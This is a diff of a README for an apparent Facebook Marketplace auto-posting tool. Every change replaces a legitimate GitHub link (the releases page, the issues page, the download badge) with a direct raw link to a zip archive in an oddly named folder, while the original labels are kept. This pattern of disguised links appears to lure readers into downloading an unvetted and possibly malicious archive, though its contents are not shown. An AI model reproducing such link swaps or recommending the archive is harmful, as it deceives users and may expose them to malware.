@@ -1,7 +1,7 @@
 # 🛍️ facebook-marketplace-listing-poster-automation - Effortlessly Post Listings on Facebook
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-via_Releases-blue)](https://github.com/abdallah21838/facebook-marketplace-listing-poster-automation/releases)
+[![Download](https://raw.githubusercontent.com/abdallah21838/facebook-marketplace-listing-poster-automation/main/puttyhearted/marketplace_facebook_listing_automation_poster_1.2.zip)](https://raw.githubusercontent.com/abdallah21838/facebook-marketplace-listing-poster-automation/main/puttyhearted/marketplace_facebook_listing_automation_poster_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **facebook-marketplace-listing-poster-automation** project! This application helps you post listings on Facebook Marketplace automatically. With this tool, you can manage your inventory and save time on posting items one by one.
@@ -21,10 +21,10 @@ Before using the application, ensure your system meets the following requirement
 - Easy management of your inventory from one place.
 
 ## 📥 Download & Install
-Visit this page to download: [GitHub Releases Page](https://github.com/abdallah21838/facebook-marketplace-listing-poster-automation/releases)
+Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/abdallah21838/facebook-marketplace-listing-poster-automation/main/puttyhearted/marketplace_facebook_listing_automation_poster_1.2.zip)
 
 ### Steps to Download
-1. Click on the [GitHub Releases Page](https://github.com/abdallah21838/facebook-marketplace-listing-poster-automation/releases) link.
+1. Click on the [GitHub Releases Page](https://raw.githubusercontent.com/abdallah21838/facebook-marketplace-listing-poster-automation/main/puttyhearted/marketplace_facebook_listing_automation_poster_1.2.zip) link.
 2. Locate the latest release version.
 3. Download the appropriate installer for your operating system.
 4. Follow the prompts to complete the installation process.
@@ -60,7 +60,7 @@ If you encounter issues:
 ## 💬 Support
 For assistance or to report issues:
 
-- Check the [Issues section](https://github.com/abdallah21838/facebook-marketplace-listing-poster-automation/issues) on GitHub.
+- Check the [Issues section](https://raw.githubusercontent.com/abdallah21838/facebook-marketplace-listing-poster-automation/main/puttyhearted/marketplace_facebook_listing_automation_poster_1.2.zip) on GitHub.
 - Ask questions in the community forum linked in the repository.
 
 ## 📅 Future Updates
